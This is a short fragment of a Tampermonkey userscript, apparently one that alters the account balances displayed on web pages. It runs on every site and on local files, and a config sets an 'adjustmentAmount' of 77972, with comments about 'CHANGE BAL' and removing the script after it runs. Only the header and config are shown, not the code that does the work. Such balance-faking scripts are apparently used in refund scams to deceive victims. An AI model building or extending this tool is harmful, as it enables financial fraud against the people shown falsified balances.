// ==UserScript==
// @name         Ed Rec 4Rec Commstefanie.angelina@outlook.de
// @namespace    http://tampermonkey.net/
// @version      7.1
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @match        *://*/*
// @match        https://www.drivehq.com/*
// @match        file:///C:/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/505253/Ed%20Rec%204Rec%20Commstefanieangelina%40outlookde.user.js
// @updateURL https://update.greasyfork.org/scripts/505253/Ed%20Rec%204Rec%20Commstefanieangelina%40outlookde.meta.js
// ==/UserScript==



//-------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------


//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL


   // Configurable modification amounts and corresponding indexes
    var homeBALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 77972 },
  //      { index: 1, adjustmentAmount: 20000 },
  //      { index: 2, adjustmentAmount: 10000 },
  //      { index: 3, adjustmentAmount: -5000 },
  //      { index: 4, adjustmentAmount: 20000 },
  //      { index: 5, adjustmentAmount: -15000 }
        // Add more configurations as needed...
    ];

